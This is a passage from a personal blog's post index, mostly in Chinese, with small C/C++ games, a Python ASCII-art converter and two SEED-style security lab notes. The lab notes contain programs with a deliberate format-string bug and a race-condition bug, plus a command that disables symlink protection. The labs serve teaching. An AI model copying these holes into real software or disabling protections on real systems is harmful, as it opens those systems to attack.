endl;&#125;int main() &#123; string try_again; init(); while (1) &#123; int times = count_nums; string goal_num = getGoalNum(); cout &lt;&lt; "goal_num" &lt;&lt; goal_num &lt;&lt; endl; while (times--) &#123; cout &lt;&lt; "Case #" &lt;&lt; times &lt;&lt; ":" &lt;&lt; endl; string guess_num = getNum(); cmp(guess_num, goal_num); if (match == num_digits) break; &#125; if (times == -1 &amp;&amp; match != num_digits) &#123; cout &lt;&lt; "You fail!!!" &lt;&lt; endl; cout &lt;&lt; "The answer is " &lt;&lt; goal_num &lt;&lt; endl; &#125; cout &lt;&lt; "Do you want to try again?(yes/y): "; cin &gt;&gt; try_again; if (try_again[0] == 'y' || try_again[0] == 'Y') &#123; cout &lt;&lt; "Begin a new game:" &lt;&lt; endl; continue; &#125; else break; &#125; return 0;&#125;]]></content>
      <categories>
        <category>python</category>
        <category>c++</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c++</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Format string vulnerability experiment]]></title>
    <url>%2F2018%2F10%2F03%2FFormat-string-vulnerability-experiment%2F</url>
    <content type="text"><![CDATA[code:123456789101112131415161718192021222324252627282930313233343536373839/* vul_prog.c */ #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#define SECRET1 0x44#define SECRET2 0x55int main(int argc, char *argv[])&#123; char user_input[100]; int *secret; long int_input; int a, b, c, d; /* other variables, not used here.*/ /* The secret value is stored on the heap */ secret = (int *) malloc(2*sizeof(int)); /* getting the secret */ secret[0] = SECRET1; secret[1] = SECRET2; printf("The variable secret's address is 0x%8x (on stack)\n", &amp;secret); printf("The variable secret's value is 0x%8x (on heap)\n", secret); printf("secret[0]'s address is 0x%8x (on heap)\n", &amp;secret[0]); printf("secret[1]'s address is 0x%8x (on heap)\n", &amp;secret[1]); printf("Please enter a decimal integer\n"); scanf("%d", &amp;int_input); /* getting an input from user */ printf("Please enter a string\n"); scanf("%s", user_input); /* getting a string from user */ /* Vulnerable place */ printf(user_input); printf("\n"); /* Verify whether your attack is successful */ printf("The original secrets: 0x%x -- 0x%x\n", SECRET1, SECRET2); printf("The new secrets: 0x%x -- 0x%x\n", secret[0], secret[1]); return 0;&#125; 在做这个实验的时候，当我准备寻找secret[1]的地址的时候，按照教程应该应该出现如下的结果但是，不知道为什么我得到的结果和他的好像不太一样： 我的结果： 总之，还是对格式化漏洞有了一个大致的了解，突然开始怀疑自做的这些事情是不是有意义。也发现原来hacker并不是那么容易就能够达到很高的水平。]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Race condition vulnerability experiment]]></title>
    <url>%2F2018%2F10%2F02%2FRace-condition-vulnerability-experiment%2F</url>
    <content type="text"><![CDATA[竞态条件漏洞实验 $ sudo su$ echo 0 &gt; /proc/sys/fs/protected_symlinks$ exit fs.protected_symlinks用于限制普通用户建立软链接0：不限制用户建立软链接1：限制，允许用户建立软连接的情况是 软连接所在目录是全局可读写目录或者软连接的uid与跟从者的uid匹配，又或者目录所有者与软连接所有者匹配 $ cd /home/shiyanlou/seed$ sudo vi vulp.c 12345678910111213141516171819202122232425/* vulp.c */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define DELAY 10000int main()&#123; char * fn = "/tmp/XYZ"; char buffer[60]; FILE *fp; long int i; /* get user input */ scanf("%50s", buffer ); if(!access(fn, W_OK))&#123; for(i=0; i &lt; DELAY; i++)&#123; int a = i^2; &#125; fp = fopen(fn, "a+"); fwrite("\n", sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); &#125; else printf("No permission \n");&#125; 实验1: 利用竞态条件漏洞123456$ ls -l-rw-rw-r-- 1 shiyanlou shiyanlou 10 Apr 23 13:33 append_text 《--VULP输入文件-rw-rw-r-- 1 root root 0 Apr 23 13:32 root_file 《--目标文件-rw-rw-r-- 1 shiyanlou shiyanlou 0 Apr 23 13:45 tmp_file 《--助攻-rwsr-xr-x 1 root root 7403 Apr 23 13:27 vulp 《--漏洞文件-rw-r--r-- 1 root root 454 Apr 23 13:27 vulp.c $ sudo gcc vulp.c -o vulp]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python image convert string]]></title>
    <url>%2F2018%2F10%2F02%2FPython-image-convert-string%2F</url>
    <content type="text"><![CDATA[通过应用pillow库和Argparse库来实现图片转字符画的功能。 code:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from PIL import Imageimport argparse#命令行输入参数处理parser = argparse.ArgumentParser()parser.add_argument('file') #输入文件parser.add_argument('-o', '--output') #输出文件parser.add_argument('--width', type = int, default = 80) #输出字符画宽parser.add_argument('--height', type = int, default = 80) #输出字符画高#获取参数args = parser.parse_args()IMG = args.fileWIDTH = args.widthHEIGHT = args.heightOUTPUT = args.outputascii_char = list("$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\"^`'. ")# 将256灰度映射到70个字符上def get_char(r,g,b,alpha = 256): if alpha == 0: return ' ' length = len(ascii_char) gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) unit = (256.0 + 1)/length return ascii_char[int(gray/unit)]if __name__ == '__main__': im = Image.open(IMG) im = im.resize((WIDTH,HEIGHT), Image.NEAREST) txt = "" for i in range(HEIGHT): for j in range(WIDTH): txt += get_char(*im.getpixel((j,i))) txt += '\n' print(txt) #字符画输出到文件 if OUTPUT: with open(OUTPUT,'w') as f: f.write(txt) else: with open("output.txt",'w') as f: f.write(txt) 处理过之后的“哆啦A梦”： $$$$ $$d0x0o#uxx0z#$$ $WcxxxxW &quot;kx} &quot;hd$ $qxxxxxxJ &quot;c Wxd$ $#xxxxxxxch # cxu$ $uxxxxxxxxk&gt; p&quot;- h} #xxxB $0xxxxxxxxxx# # n &quot;h I# nxxxx$ $Yxxxxxxxxxxx# I }C -qcxxx$ $Yxxxxxxxxxxxq#( &quot;- z -occ$ $xxxxxxxxxxc#(Ip ( COC( h pu$ $xxxxxxxxxuh &quot;&gt; n}p zk8&quot; &quot;8$$$ mxxxxxxxxk&quot; &gt;C ff &amp;\ kk }#&gt;# $ $xxxxxxxx# -Cp} ok\kkk&gt; C( &quot;$ cxxxxxxxW }zh( @kkkko &gt; $ $xxxxxxxq }h 8kko( p mxxxxxxx&gt; - #pnf----I p $xxxxxxuW &gt;nn---I O $ $xxxxxx#&quot; -&gt; p I Wxxxxxx&gt; n- OhnI $ qxxxxx0 }&amp;%%%pOn}I (( -n }Oh$ Jxxxxx# &quot;kkkkkkka8%*aW%pn- -n }CI$ Jxxxxxp -kkkkkWB8akkkkkkoWBhp}I &gt;z# $ cxxxxx} nk*%okkkkkkkkkkkkkkkkkkkkkkkk&quot; $ Jxxxxx nkkkkkkkkkkkkkkkkkkkkkkkkkkk% $ Jxxxxx Ikkkkkkkkkkkkkkkkkkkkkkkkkkk- qxxxxx akkkkkkkkkkkkkkkkkkkkkkkkkB f Wxxxxx 8kkkaW%8#kkkkkkkkkkkkkkkkh&quot; 8 $xxxxx Ik&amp;YffffffQBhkkkkkkkkkkkkO z$ $xxxxx( $ffffffffffx@kkkkkkkkkkB $ mxxxx# &quot;ufffffffffffbkkkkkkkk# I $xxxxY nffffffffffffMkkkkkka&quot; 8 uxxxxf hffffffffffffWkkkka&gt; I qxxxx# &quot;Qfffffffffff%kkkkW O $xxxxcp &quot;bffffffffffckkk8 &quot;$ dxxxxc omfffffffffa8C $ $xxxxxW CQffffffQz 8 $xxxxx} &gt;hbpo( 8 #xxxxY&quot; -(O%$} IBkkkkkkkoB 0xxxx0 &gt;O%*kkkkB k#j&gt;Ij#kk$ $Jxxm8akkkkoWW&amp;&quot; Jwj1j0C($ $$okkk*&amp;Lxxxxd h_IIIIM $ $Wkh8qxxxxxxx# OIIXbIX * $mxxxxxxxxxxq aII[wI# z cxxxxxxxxxxxI uIII\j - Jxxxxxxxxxxxp fhIII_h &gt; kxxxxxxxxxxx0p n&quot; -( $xxxxxxxxxJh &gt;p8#phpCnnnCppI$ $$$ $xxxxxxuWcx pf p$ $} n$ $xxxJ#dxxx0 n n$8 f xxxxxxxxx# p z$ $ Jxxxxxxxx# O h&quot; h kxxxxxxxx# &quot; &quot;8 O Bxxxxxxxxm p pI p $$$ $xxxxxxxxxI h &quot;O} 8 #kkk$$xxxxxxxxx8 &quot;hn- --zO $ $ $kkkk%$xxxxxxxxxJ -npnn- fh $ $kkkkM$xxxxxxxxxxk CxC } akkk$$xxxxxxxxxxxq&gt; Wxxz $ $$$$ Bxxxxxxxxxxxxx8} fhcxxxh I qxxxxxxxxxxxxxxxxJYxxxxxxxm $ JxxxxxxxxxxxxxxxxxxxxxxxJd#( h $$xxxxxxxxxxxxxxxxxxxJW$$ $- 8 h&quot; xxxxxxxxxxxxxxxxc@$ $pp$$ $ uxxxxxxxxxxxxx0$ O #xxxxxxxxxxxJ$ &gt; &gt;xxxxxxxxxu$ Cxxxxxxuk$ #xxxxx8$ (ocJ$ - 8 O $ $ O $ $&quot; n $*I p$ $$$]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[using c++ to realize Tetris]]></title>
    <url>%2F2018%2F10%2F01%2Fusing-c-to-realize-Tetris%2F</url>
    <content type="text"><![CDATA[这两天学习了一下怎么用c++来实现俄罗斯方块，虽然最后的界面很感人，但是在这个过程中还是学到了不少的东西。code： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495#include &lt;iostream&gt;#include &lt;sys/time.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;#include &lt;ncurses.h&gt;#include &lt;unistd.h&gt;using namespace std;void swap(int &amp;a, int &amp;b)&#123; int t=a; a = b; b = t;&#125;int getrand(int min, int max)&#123; return(min+rand()%(max-min+1));&#125;WINDOW *create_newwin(int height,int width,int starty,int startx);void destory_win(WINDOW *local_win);int game_win_height=30; int game_win_width=45;int hint_win_height=10;int hint_win_width=20;WINDOW * game_win, *hint_win ,*score_win;int key;class Piece&#123;public: int score; int shape; int next_shape; int head_x; // 当前方块首个box的位置 int head_y; int size_h; int size_w; int next_size_h; int next_size_w; int box_shape[4][4]; int next_box_shape[4][4]; int box_map[30][45]; bool game_over;public: void initial(); void set_shape(int &amp;cshape, int box_shape[][4],int &amp;size_w, int &amp; size_h); void score_next(); void judge(); void move(); void rotate(); bool isaggin(); bool exsqr(int row); &#125;;int main()&#123; initscr(); //raw(); cbreak(); noecho(); curs_set(0); keypad(stdscr,TRUE); refresh(); game_win = create_newwin(game_win_height, game_win_width, 0,0); wborder(game_win, '*', '*', '*', '*', '*', '*', '*', '*'); wrefresh(game_win); hint_win = create_newwin(hint_win_height, hint_win_width, 0, game_win_width+10); mvprintw(0, game_win_width+10+2,"%s","Next"); refresh(); score_win = create_newwin(hint_win_height, hint_win_width, 20, game_win_width+10); mvprintw(20, game_win_width+10+2,"%s","Score"); refresh(); Piece* pp = new Piece; pp-&gt;initial(); while(1) &#123; pp-&gt;move(); if(pp-&gt;game_over) break; &#125; destory_win(game_win); destory_win(hint_win); destory_win(score_win); delete pp; system("clear"); int row,col; getmaxyx(stdscr,row,col); mvprintw(row/2,col/2 ,"%s","GAMER OVER ! \n "); mvprintw(row/2+2,col/2-2 ,"%s","Wait 5s to return tthe erminal ! \n "); refresh(); sleep(5); endwin(); return 0;&#125;WINDOW *create_newwin(int height, int width, int starty, int startx)&#123; WINDOW *local_win; local_win = newwin(height, width, starty, startx); box(local_win,0,0); wrefresh(local_win); return local_win;&#125;void destory_win(WINDOW *local_win)&#123; wborder(local_win, ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '); wrefresh(local_win); delwin(local_win);&#125;void Piece::initial()&#123; score=0; game_over=false; for(int i =0;i&lt;game_win_height;i++) for(int j=0;j&lt;game_win_width;j++)&#123; if(i==0 || i==game_win_height-1 || j==0 || j==game_win_width-1)&#123; box_map[i][j]=1; &#125; else box_map[i][j]=0; &#125; srand((unsigned)time(0)); shape=getrand(0,6); set_shape(shape,box_shape,size_w,size_h); next_shape=getrand(0,6); set_shape(next_shape,next_box_shape,next_size_w,next_size_h); for(int i =0;i&lt;4;i++) for(int j=0;j&lt;4;j++) if(next_box_shape[i][j]==1)&#123; mvwaddch(hint_win,(hint_win_height-size_h)/2+i,(hint_win_width-size_w)/2+j,'#'); wrefresh(hint_win); &#125; mvwprintw(score_win, hint_win_height/2,hint_win_width/2-2,"%d",score); wrefresh(score_win);&#125;void Piece::set_shape(int &amp;cshape, int shape[][4],int &amp;size_w,int &amp;size_h)&#123; int i,j; for(i=0;i&lt;4;i++) for(j=0;j&lt;4;j++) shape[i][j]=0; switch(cshape) &#123; case 0: // "####" size_h=1; size_w=4; shape[0][0]=1; shape[0][1]=1; shape[0][2]=1; shape[0][3]=1; break; case 1: // "#" size_h=2; // "###" size_w=3; shape[0][0]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; case 2: // " #" size_h=2; // "###" size_w=3; shape[0][2]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; case 3: // " ##" size_h=2; // "##" size_w=3; shape[0][1]=1; shape[0][2]=1; shape[1][0]=1; shape[1][1]=1; break; case 4: // "##" size_h=2; // " ##" size_w=3; shape[0][0]=1; shape[0][1]=1; shape[1][1]=1; shape[1][2]=1; break; case 5: // "##" size_h=2; // "##" size_w=2; shape[0][0]=1; shape[0][1]=1; shape[1][0]=1; shape[1][1]=1; break; case 6: // " #" size_h=2; // "###" size_w=3; shape[0][1]=1; shape[1][0]=1; shape[1][1]=1; shape[1][2]=1; break; &#125; head_x=game_win_width/2; // 初始化起始位置 head_y=1; if(isaggin()) /* GAME OVER ! */ game_over=true;&#125;void Piece::rotate()&#123; int temp[4][4]=&#123;0&#125;; int temp_piece[4][4]=&#123;0&#125;; int i,j,tmp_size_h,tmp_size_w; tmp_size_w=size_w; tmp_size_h=size_h; for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++) temp_piece[i][j]=box_shape[i][j]; for(i=0;i&lt;4;i++) for(j=0;j&lt;4;j++) temp[j][i]=box_shape[i][j]; i=size_h; size_h=size_w; size_w=i; for(i=0;i&lt;size_h;i++) for(j=0;j&lt;size_w;j++) box_shape[i][size_w-1-j]=temp[i][j]; if(isaggin())&#123; for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++) box_shape[i][j]=temp_piece[i][j]; size_w=tmp_size_w; size_h=tmp_size_h; &#125; else&#123; for(int i=0; i&lt;4;i++) for(int j=0;j&lt;4;j++)&#123; if(temp_piece[i][j]==1)&#123; mvwaddch(game_win,head_y+i,head_x+j,' '); wrefresh(game_win); &#125; &#125; for(int i=0; i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++)&#123; if(this-&gt;box_shape[i][j]==1)&#123; mvwaddch(game_win,head_y+i,head_x+j,'#'); wrefresh(game_win); &#125; &#125; &#125;&#125;void Piece::move()&#123; fd_set set; FD_ZERO(&amp;set); FD_SET(0, &amp;set); struct timeval timeout; timeout.tv_sec = 0; timeout.tv_usec= 500000; // timeout设置为最多等待时间，超过这个时间将不再等待getchar if (select(1, &amp;set, NULL, NULL, &amp;timeout) == 0)&#123; head_y++; if(isaggin())&#123; head_y--; for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++) if(box_shape[i][j]==1) box_map[head_y+i][head_x+j]=1; score_next(); &#125; else&#123; for(int i=size_h-1; i&gt;=0;i--) for(int j=0;j&lt;size_w;j++)&#123; if(this-&gt;box_shape[i][j]==1)&#123; mvwaddch(game_win,head_y-1+i,head_x+j,' '); mvwaddch(game_win,head_y+i,head_x+j,'#'); &#125; &#125; wrefresh(game_win); &#125; &#125; if (FD_ISSET(0, &amp;set)) &#123; // 如果在规定的时间内检测到按键，得到输入key = getchar(); while ((key = getch()) == -1) ; if(key==KEY_LEFT)&#123; // 进行相关的上下左右的移动 head_x--; if(isaggin()) head_x++; //undo else&#123; for(int i=0; i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++)&#123; if(this-&gt;box_shape[i][j]==1)&#123; mvwaddch(game_win,head_y+i,head_x+j+1,' '); mvwaddch(game_win,head_y+i,head_x+j,'#'); &#125; &#125; wrefresh(game_win); &#125; &#125; if(key==KEY_RIGHT)&#123; head_x++; if(isaggin()) head_x--; else&#123; for(int i=0; i&lt;size_h;i++) for(int j=size_w-1;j&gt;=0;j--)&#123; if(this-&gt;box_shape[i][j]==1)&#123; mvwaddch(game_win,head_y+i,head_x+j-1,' '); mvwaddch(game_win,head_y+i,head_x+j,'#'); &#125; &#125; wrefresh(game_win); &#125; &#125; if(key==KEY_DOWN)&#123; head_y++; if(isaggin())&#123; head_y--; for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++) if(box_shape[i][j]==1) box_map[head_y+i][head_x+j]=1; score_next(); &#125; else&#123; for(int i=size_h-1; i&gt;=0;i--) for(int j=0;j&lt;size_w;j++)&#123; if(this-&gt;box_shape[i][j]==1)&#123; mvwaddch(game_win,head_y-1+i,head_x+j,' '); mvwaddch(game_win,head_y+i,head_x+j,'#'); &#125; &#125; wrefresh(game_win); &#125; &#125; if(key==KEY_UP) rotate(); if(head_x+size_w+1&gt;game_win_width) head_x=game_win_width-size_w-1; if(head_x&lt;1) head_x=1; &#125;&#125;bool Piece::isaggin()&#123; // 判断图形是否与边界或其他图形产生冲突。 for(int i=0;i&lt;size_h;i++) for(int j=0;j&lt;size_w;j++)&#123; if(box_shape[i][j]==1)&#123; if(head_y+i &gt; game_win_height-2) // 高 return true; if(head_x+j &gt; game_win_width-2 || head_x+i-1&lt;0) // 宽 return true; if(box_map[head_y+i][head_x+j]==1) // 其他图形 return true ; &#125; &#125; return false;&#125;bool Piece::exsqr(int row)&#123; // 检查当前行是否是空行 for(int j=1;j&lt;game_win_width-1;j++) if(box_map[row][j]==1) return true; return false;&#125;void Piece::judge()&#123; // 判断当前行是否已满 int i,j; int line=0; bool full; for(i=1;i&lt;game_win_height-1;i++)&#123; full=true; for(j=1;j&lt;game_win_width-1;j++)&#123; if(box_map[i][j]==0) full=false; &#125; if(full)&#123; line++; // 标记已满的行数 score+=50; // 如果当前行已满，则对应的分数+50，并将当前行中的所有元素制0 for(j=1;j&lt;game_win_width-1;j++) box_map[i][j]=0; &#125; &#125; if(line!=0)&#123; for(i=game_win_height-2;i&gt;=2;i--)&#123; // 从最底层开始判断 int s=i; if(exsqr(i)==0)&#123; // 判断当前行是否是空行 while(s&gt;1 &amp;&amp; exsqr(--s)==0); // 向上寻找，直到出现不是空行的行 for(j=1;j&lt;game_win_width-1;j++)&#123; box_map[i][j]=box_map[s][j]; box_map[s][j]=0; // 将不是空行的，移动到最下层的空行处，并将移动过之后的位置制0 &#125; &#125; &#125; for(int i=1;i&lt;game_win_height-1;i++) // 刷新屏幕 for(int j=1;j&lt;game_win_width-1;j++)&#123; if(box_map[i][j]==1)&#123; mvwaddch(game_win,i,j,'#'); wrefresh(game_win); &#125; else&#123; mvwaddch(game_win,i,j,' '); wrefresh(game_win); &#125; &#125; &#125;&#125; void Piece::score_next()&#123; score+=10; judge(); mvwprintw(score_win, hint_win_height/2,hint_win_width/2-2,"%d",score); // 显示分数 wrefresh(score_win); set_shape(next_shape,box_shape,size_w,size_h); this-&gt;next_shape=getrand(0,6); // 显示下一个图形 set_shape(next_shape,next_box_shape,next_size_w,next_size_h); for(int i =1;i&lt;hint_win_height-1;i++) for(int j=1;j&lt;hint_win_width-1;j++)&#123; mvwaddch(hint_win, i, j,' '); wrefresh(hint_win); &#125; for(int i =0;i&lt;4;i++) for(int j=0;j&lt;4;j++) if(next_box_shape[i][j]==1)&#123; mvwaddch(hint_win,(hint_win_height-size_h)/2+i,(hint_win_width-size_w)/2+j,'#'); wrefresh(hint_win); &#125;&#125; 在这个过程中也学到了c++的一些其他的知识。 select函数 用法 c++ select函数用于在非阻塞中，当一个套接字或一组套接字有信号时通知你，系统提供select函数来实现多路复用输入/输出模型，原型：int select(int maxfd,fd_set rdset,fd_set wrset,fd_set exset,struct timeval timeout);所在的头文件为：#include &lt;sys/time.h&gt; 和#include &lt;unistd.h&gt;先对函数中的参数做一个简单的介绍。参数maxfd是需要监视的最大的文件描述符值+1；rdset,wrset,exset分别对应于需要检测的可读文件描述符的集合，可写文件描述符的集 合及异常文件描述符的集合。struct timeval结构用于描述一段时间长度，如果在这个时间内，需要监视的描述符没有事件发生则函数返回，返回值为0。 作者：shuolol链接：https://www.jianshu.com/p/b5d7b7c6b9f7來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。 addch(), echochar(), mvaddch(), mvwaddch(), waddch(), wechochar() 1234567891011121314//SYNOPSIS#include &lt;curses.h&gt;int addch(chtype ch);int waddch(WINDOW *win, chtype ch);int mvaddch(int y, int x, chtype ch);int mvwaddch(WINDOW *win, int y, int x, chtype ch);int echochar(chtype ch);int wechochar(WINDOW *win, chtype ch); DESCRIPTIONThe addch(), waddch(), mvaddch() and mvwaddch() routines put the character ch into the given window at its current window position, which is then advanced. They are analogous to putchar() in stdio(). If the advance is at the right margin, the cursor automatically wraps to the beginning of the next line. At the bottom of the current scrolling region, if scrollok() is enabled, the scrolling region is scrolled up one line. If ch is a tab, newline, or backspace, the cursor is moved appropriately within the window. Backspace moves the cursor one character left; at the left edge of a window it does nothing. Newline does a clrtoeol(), then moves the cursor to the window left margin on the next line, scrolling the window if on the last line). Tabs are considered to be at every eighth column. If ch is any control character other than tab, newline, or backspace, it is drawn in ^X notation. Calling winch() after adding a control character does not return the character itself, but instead returns the ^-representation of the control character. (To emit control characters literally, use echochar().) Video attributes can be combined with a character argument passed to addch() or related functions by logical-ORing them into the character. (Thus, text, including attributes, can be copied from one place to another using inch() and addch().). See the curs_attr() page for values of predefined video attribute constants that can be usefully OR’ed into characters. The echochar() and wechochar() routines are equivalent to a call to addch() followed by a call to refresh(), or a call to waddch() followed by a call to wrefresh(). The knowledge that only a single character is being output is used and, for non-control characters, a considerable performance gain may be seen by using these routines instead of their equivalents.]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[using c++ to realize 2048]]></title>
    <url>%2F2018%2F09%2F29%2Fusing-c-to-realize-2048%2F</url>
    <content type="text"><![CDATA[今天，学习了怎么用c语言来实现2048这样一个小游戏了。虽然，自己现在还没有动手自己去开发的能力，但是，当自己照着被人的，代码写出来游戏，自己玩着还是很开心的。最关键的是，自己可以在游戏中，加一些别人意想不到的东西^*^代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;curses.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;int a[4][4] = &#123;0&#125;;int empty;int old_y, old_x;void draw(); // 绘制游戏界面void play();void init(); // 初始化void draw_one(int y, int x);void cnt_value(int *new_y, int *new_x);int game_over();int cnt_one(int y, int x);int endwin();int main() &#123; init(); play(); endwin(); return 0;&#125;void init()&#123; int x, y; initscr(); cbreak(); noecho(); curs_set(0); empty = 15; // 标记当前存在的空位置，若为15则游戏结束 srand(time(0)); x = rand() % 4; // rand()函数生成随机数 y = rand() % 4; // 随机生成的位置 a[y][x] = 2; // 将其盘中的该位置赋值 draw();&#125;void draw()&#123; int n, m, x, y; char c[4] = &#123;'0', '0', '0', '0'&#125;; clear(); for(n = 0; n &lt; 9; n += 2) // 绘制行 for(m = 0; m &lt; 21; m++) &#123; move(n, m); addch('-'); refresh(); &#125; for(m = 0; m &lt; 22; m += 5) // 绘制列 for(n = 1; n &lt; 8; n++) &#123; move(n, m); addch('|'); refresh(); &#125; for(y = 0; y &lt; 4; y++) for(x = 0; x &lt; 4; x++) &#123; draw_one(y, x); &#125;&#125;void draw_one(int y, int x)&#123; int i, m, k, j; int num; char c[5] = &#123;0x00&#125;; num = i = a[y][x]; m = 0; while(i &gt; 0) &#123; j = i % 10; c[m++] = j + '0'; i = i / 10; &#125; m = 0; k = (x + 1) * 5 - 1; while(c[m] != 0x00) &#123; move(2*y+1, k); addch(c[m++]); // 将字符添加到相应的位置 if (num == 2048) &#123; move( 15, 15 ); printw( "%s", "niconiconiconi!!!!" ); &#125; k--; &#125;&#125;void play()&#123; int x, y, i, new_x, new_y, temp; int old_empty, move; char ch; while(1) &#123; move = 0; old_empty = empty; ch = getch(); switch(ch) &#123; case 97: // 左 case 104: case 68: for(y = 0; y &lt; 4; y++) // 遍历所有的位置 for(x = 0; x &lt; 4; ) &#123; if(a[y][x] == 0) // "0 0 2 2" 第一个和第二个数字都为0， 下次移动的时候后的状态"4 0 0 0"" &#123; // 此处好像并没有解决这个问题，这个for循环最后只能得到"0 0 4 0"" x++; continue; &#125; else &#123; for(i = x + 1; i &lt; 4; i++) &#123; if(a[y][i] == 0) &#123; continue; &#125; else &#123; if(a[y][x] == a[y][i]) // 如果两个位置的数字相同， 右边的数字与左边的数字合并 &#123; a[y][x] += a[y][i]; a[y][i] = 0; empty++; // 空格的数量增加1 break; &#125; else &#123; break; &#125; &#125; &#125; x = i; // "4 2 2 8" 4 和 2 不相等，此处的x = i，就有一种x++的意思。 &#125; &#125; for(y = 0; y &lt; 4; y++) // 这里能够把上面"0 0 4 0",这种状态转化为‘4 0 0 0’这种状态 for(x = 0; x &lt; 4; x++) &#123; if(a[y][x] == 0) &#123; continue; &#125; else &#123; for(i = x; (i &gt; 0) &amp;&amp; (a[y][i-1] == 0); i--) &#123; a[y][i-1] = a[y][i]; a[y][i] = 0; move = 1; //此处的move用来标记新状态的产生 &#125; &#125; &#125; break; case 100: // 右 case 108: case 67: for(y = 0; y &lt; 4; y++) for(x = 3; x &gt;= 0; ) &#123; if(a[y][x] == 0) &#123; x--; continue; &#125; else &#123; for(i = x - 1; i &gt;= 0; i--) &#123; if(a[y][i] == 0) &#123; continue; &#125; else if(a[y][x] == a[y][i]) &#123; a[y][x] += a[y][i]; a[y][i] = 0; empty++; break; &#125; else &#123; break; &#125; &#125; x = i; &#125; &#125; for(y = 0; y &lt; 4; y++) for(x = 3; x &gt;= 0; x--) &#123; if(a[y][x] == 0) &#123; continue; &#125; else &#123; for(i = x; (i &lt; 3) &amp;&amp; (a[y][i+1] == 0); i++) &#123; a[y][i+1] = a[y][i]; a[y][i] = 0; move = 1; &#125; &#125; &#125; break; case 119: // 上 case 107: case 65: for(x = 0; x &lt; 4; x++) for(y = 0; y &lt; 4; ) &#123; if(a[y][x] == 0) &#123; y++; continue; &#125; else &#123; for(i = y + 1; i &lt; 4; i++) &#123; if(a[i][x] == 0) &#123; continue; &#125; else if(a[y][x] == a[i][x]) &#123; a[y][x] += a[i][x]; a[i][x] = 0; empty++; break; &#125; else &#123; break; &#125; &#125; y = i; &#125; &#125; for(x = 0; x &lt; 4; x++) for(y = 0; y &lt; 4; y++) &#123; if(a[y][x] == 0) &#123; continue; &#125; else &#123; for(i = y; (i &gt; 0) &amp;&amp; (a[i-1][x] == 0); i--) &#123; a[i-1][x] = a[i][x]; a[i][x] = 0; move = 1; &#125; &#125; &#125; break; case 115: // 下 case 106: case 66: for(x = 0; x &lt; 4; x++) for(y = 3; y &gt;= 0; ) &#123; if(a[y][x] == 0) &#123; y--; continue; &#125; else &#123; for(i = y - 1; i &gt;= 0; i--) &#123; if(a[i][x] == 0) &#123; continue; &#125; else if(a[y][x] == a[i][x]) &#123; a[y][x] += a[i][x]; a[i][x] = 0; empty++; break; &#125; else &#123; break; &#125; &#125; y = i; &#125; &#125; for(x = 0; x &lt; 4; x++) for(y = 3; y &gt;= 0; y--) &#123; if(a[y][x] == 0) &#123; continue; &#125; else &#123; for(i = y; (i &lt; 3) &amp;&amp; (a[i+1][x] == 0); i++) &#123; a[i+1][x] = a[i][x]; a[i][x] = 0; move = 1; &#125; &#125; &#125; break; case 'Q': case 'q': game_over(); break; default: continue; break; &#125; if(empty &lt;= 0) game_over(); 